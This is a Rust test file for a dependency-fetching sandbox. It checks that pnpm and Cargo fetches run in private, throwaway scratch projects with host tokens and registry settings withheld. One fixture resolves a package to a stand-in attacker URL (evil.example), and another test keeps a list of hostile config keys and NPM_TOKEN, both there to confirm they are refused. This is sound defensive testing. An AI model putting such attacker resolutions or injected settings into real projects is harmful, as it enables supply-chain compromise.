    };
    fetch_pnpm(&tree.worktree, &tree.frontend, Some(&tree.store), &host)
}

#[test]
fn a_missing_npm_package_is_fetched_from_the_registry_into_the_host_store() {
    let tree = pnpm_tree(PNPM_LOCK_OK, Some("allowBuilds:\n  sharp: true\n"));
    let runner = FakeRunner::new(false, true);
    let step = run_pnpm(&tree, &runner).unwrap();
    assert_eq!(step.outcome, FetchOutcome::Fetched);
    assert_eq!(step.ecosystem, Ecosystem::Pnpm);
    assert_eq!(step.lockfile, "frontend/pnpm-lock.yaml");
    assert_eq!(step.registries, vec![NPM_REGISTRY.to_string()]);

    let commands = runner.commands();
    assert_eq!(commands.len(), 2);
    let online = &commands[1];
    assert_eq!(online.program, "pnpm");
    for flag in ["--ignore-scripts", "--registry", NPM_REGISTRY] {
        assert!(online.args.contains(&flag.to_string()), "{flag}");
    }
    assert!(online
        .args
        .contains(&tree.store.to_string_lossy().into_owned()));
    assert!(commands[0].args.contains(&"--offline".to_string()));
    assert!(!commands[0].args.contains(&"--registry".to_string()));
}

#[test]
fn pnpm_runs_in_a_scratch_project_of_validated_files_that_is_gone_afterwards() {
    let tree = pnpm_tree(PNPM_LOCK_OK, Some(WORKSPACE_HOSTILE));
    let scratch_root = tree.scratch_root.clone();
    let worktree = tree.worktree.clone();
    let runner = FakeRunner::inspecting(
        true,
        true,
        Box::new(move |command| {
            assert!(
                command.cwd.starts_with(&scratch_root),
                "scratch is under its root"
            );
            assert!(!command.cwd.starts_with(&worktree));
            assert!(command.cwd.join("pnpm-lock.yaml").is_file());
            assert_eq!(
                std::fs::read_to_string(command.cwd.join("package.json")).unwrap(),
                STAGED_MANIFEST
            );
            assert!(
                !command.cwd.join(".npmrc").exists(),
                "the worker's .npmrc is not staged"
            );
            // Nothing the worker wrote reaches the scratch project.
            for entry in std::fs::read_dir(&command.cwd).unwrap().flatten() {
                let content = std::fs::read_to_string(entry.path()).unwrap();
                for hostile in [
                    EVIL,
                    "registry",
                    "proxy",
                    "storeDir",
                    "pnpmfile",
                    "hooks",
                    "cafile",
                    "NPM_TOKEN",
                ] {
                    assert!(
                        !content.contains(hostile),
                        "{hostile} reached {:?}",
                        entry.file_name()
                    );
                }
            }
            let workspace =
                std::fs::read_to_string(command.cwd.join("pnpm-workspace.yaml")).unwrap();
            assert!(workspace.contains("sharp"), "{workspace}");
        }),
    );
    let step = run_pnpm(&tree, &runner).unwrap();
    assert_eq!(step.outcome, FetchOutcome::Cached);
    assert_eq!(runner.commands().len(), 1);
    assert_eq!(
        leftovers(&tree.scratch_root),
        0,
        "the scratch project is removed"
    );
}

#[test]
fn a_pnpm_fetch_never_sees_a_host_registry_setting_or_token() {
    let tree = pnpm_tree(PNPM_LOCK_OK, None);
    let runner = FakeRunner::new(false, true);
    run_pnpm(&tree, &runner).unwrap();
    let commands = runner.commands();
    assert_eq!(commands.len(), 2);
    for command in &commands {
        assert_hostile_environment_withheld(command);
        assert!(env_of(command, "PATH").is_some());
        // The user and global npm configuration are an empty file.
        for name in ["npm_config_userconfig", "npm_config_globalconfig"] {
            let path = PathBuf::from(env_of(command, name).expect(name));
            assert_eq!(path, command.cwd.join(EMPTY_NPMRC));
        }
    }
}

#[test]
fn a_pnpm_lock_pointing_elsewhere_than_the_registry_fetches_nothing() {
    let tree = pnpm_tree(
        &lock_with_resolution("resolution: {tarball: https://evil.example/x.tgz}"),
        None,
    );
    let runner = FakeRunner::new(false, true);
    let step = run_pnpm(&tree, &runner).unwrap();
    assert!(matches!(step.outcome, FetchOutcome::Refused { .. }));
    assert!(step.registries.is_empty());
    assert!(runner.commands().is_empty());
    assert_eq!(leftovers(&tree.scratch_root), 0);
}

#[test]
fn an_unreadable_workspace_file_refuses_the_pnpm_fetch() {
    let tree = pnpm_tree(PNPM_LOCK_OK, Some("allowBuilds: [\n"));
    let runner = FakeRunner::new(false, true);
    let step = run_pnpm(&tree, &runner).unwrap();
    assert!(matches!(step.outcome, FetchOutcome::Refused { .. }));
    assert!(runner.commands().is_empty());
}

#[test]
fn a_pnpm_lock_without_packages_or_a_host_without_a_store_is_handled() {
    let empty = pnpm_tree("lockfileVersion: '9.0'\n\nimporters:\n  .: {}\n", None);
    let runner = FakeRunner::new(false, true);
    assert!(run_pnpm(&empty, &runner).is_none());

    let tree = pnpm_tree(PNPM_LOCK_OK, None);
    let cancel = CancellationToken::new();
    let host = FetchHost {
        scratch_root: &tree.scratch_root,
        env: &tree.env,
        runner: &runner,
        cancel: &cancel,
    };
    let step = fetch_pnpm(&tree.worktree, &tree.frontend, None, &host).unwrap();
    assert!(matches!(step.outcome, FetchOutcome::Refused { .. }));
    assert!(runner.commands().is_empty());
}

// ─── scratch sweep ────────────────────────────────────────────────────────

#[test]
fn the_startup_sweep_removes_only_the_scratch_projects_of_an_earlier_run() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join(SCRATCH_DIR_NAME);
    let leftover = root.join(format!("{SCRATCH_PREFIX}1234"));
    std::fs::create_dir_all(leftover.join("src")).unwrap();
    std::fs::write(leftover.join("Cargo.toml"), "x").unwrap();
    let foreign = root.join("somebody-elses");
    std::fs::create_dir_all(&foreign).unwrap();
    let file = root.join(format!("{SCRATCH_PREFIX}file"));
    std::fs::write(&file, "x").unwrap();

    assert_eq!(sweep_stale_scratch(&root), 1);
    assert!(!leftover.exists());
    assert!(
        foreign.exists(),
        "what is not Kronn's scratch is left alone"
    );
    assert!(file.exists());
    assert_eq!(sweep_stale_scratch(&dir.path().join("missing")), 0);
}

#[cfg(unix)]
#[test]
fn a_scratch_project_is_private_to_its_owner() {
    use std::os::unix::fs::PermissionsExt;
    let dir = tempfile::tempdir().unwrap();
    let scratch = Scratch::create(&dir.path().join(SCRATCH_DIR_NAME)).unwrap();
    let mode = std::fs::metadata(&scratch.dir)
        .unwrap()
        .permissions()
        .mode();
    assert_eq!(mode & 0o077, 0, "{mode:o}");
    let kept = scratch.dir.clone();
    drop(scratch);
    assert!(!kept.exists());
}

#[test]
fn the_scratch_root_is_a_directory_of_the_data_dir() {
    let root = scratch_root().unwrap();
    assert_eq!(root.file_name().unwrap(), SCRATCH_DIR_NAME);
    assert_eq!(
        root.parent().unwrap(),
        crate::core::config::config_dir().unwrap()
    );
}

// ─── journal record ───────────────────────────────────────────────────────

#[test]
fn the_record_round_trips_and_says_whether_anything_was_fetched() {
    let record = DepFetchRecord {
        steps: vec![DepFetchStep {
            ecosystem: Ecosystem::Cargo,
            lockfile: "backend/Cargo.lock".into(),
            registries: vec![CRATES_IO.into()],
            outcome: FetchOutcome::Fetched,
            duration_ms: 12,
        }],
    };
    assert!(record.fetched_anything());
    assert!(!record.cancelled());
    let json = serde_json::to_value(&record).unwrap();
    assert_eq!(json["steps"][0]["outcome"]["status"], "fetched");
    assert_eq!(json["steps"][0]["ecosystem"], "cargo");
    let back: DepFetchRecord = serde_json::from_value(json).unwrap();
    assert_eq!(back, record);
}

#[test]
fn a_worktree_without_lock_files_produces_an_empty_record() {
    let dir = tempfile::tempdir().unwrap();
    let worktree = dir.path().join("wt");
    std::fs::create_dir_all(&worktree).unwrap();
    let runner = FakeRunner::new(false, true);
    let record = fetch_missing_dependencies(
        &worktree,
        &dir.path().join(SCRATCH_DIR_NAME),
        &runner,
        &CancellationToken::new(),
    );
    assert!(record.steps.is_empty());
    assert!(runner.commands().is_empty());
}

// ─── real cargo ───────────────────────────────────────────────────────────

/// Stage this repository's own `Cargo.lock` the way a launch does and let the
/// real `cargo fetch --offline` read it: the staged project must be one Cargo
/// accepts and resolves to the locked versions, without touching the network.
/// Needs the host's warm `~/.cargo` registry, so it is run by hand:
/// `cargo nextest run --run-ignored only staged_cargo_project`.
#[test]
#[ignore = "runs the real cargo against the host's registry cache"]
fn the_staged_cargo_project_is_accepted_by_the_real_cargo() {
    use crate::core::task_worker_env::ProcessProbeRunner;
    let lock =
        std::fs::read_to_string(Path::new(env!("CARGO_MANIFEST_DIR")).join("Cargo.lock")).unwrap();
    let scan = scan_cargo_lock(&lock).unwrap();
    assert!(scan.registry_packages > 100);
    let manifest = staged_cargo_manifest(&scan.crates).unwrap();
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("Cargo.toml"), manifest).unwrap();
    std::fs::write(dir.path().join("Cargo.lock"), &scan.lock).unwrap();
    std::fs::write(dir.path().join("lib.rs"), "").unwrap();
    let cargo_home = crate::core::child_env::var_os("CARGO_HOME")
        .map(PathBuf::from)
        .or_else(|| {
            crate::core::child_env::var_os("HOME").map(|home| PathBuf::from(home).join(".cargo"))
        })
        .unwrap();
    let outcome = ProcessProbeRunner.run(&ProbeCommand {
        program: "cargo".into(),
        args: vec![
            "fetch".into(),
            "--offline".into(),
            "--manifest-path".into(),
            dir.path().join("Cargo.toml").to_string_lossy().into_owned(),
        ],
        cwd: dir.path().to_path_buf(),
        env: fetch_env(
            &crate::core::child_env::vars_os(),
            &[(CARGO_HOME_ENV, cargo_home.into_os_string())],
        ),
        timeout: Duration::from_secs(300),
        priority: Priority::Normal,
        clean_env: true,
    });
    assert!(outcome.success, "{}", outcome.detail);
    // Cargo resolved every locked crate to the locked version.
    let rewritten: toml::Table =
        toml::from_str(&std::fs::read_to_string(dir.path().join("Cargo.lock")).unwrap()).unwrap();
    let versions = |table: &toml::Table| -> std::collections::BTreeSet<(String, String)> {
        table["package"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|package| package.get("source").is_some())
            .map(|package| {
                (
                    package["name"].as_str().unwrap().to_string(),
                    package["version"].as_str().unwrap().to_string(),
                )
            })
            .collect()
    };
    let staged: toml::Table = toml::from_str(&scan.lock).unwrap();
    assert_eq!(versions(&rewritten), versions(&staged));
}
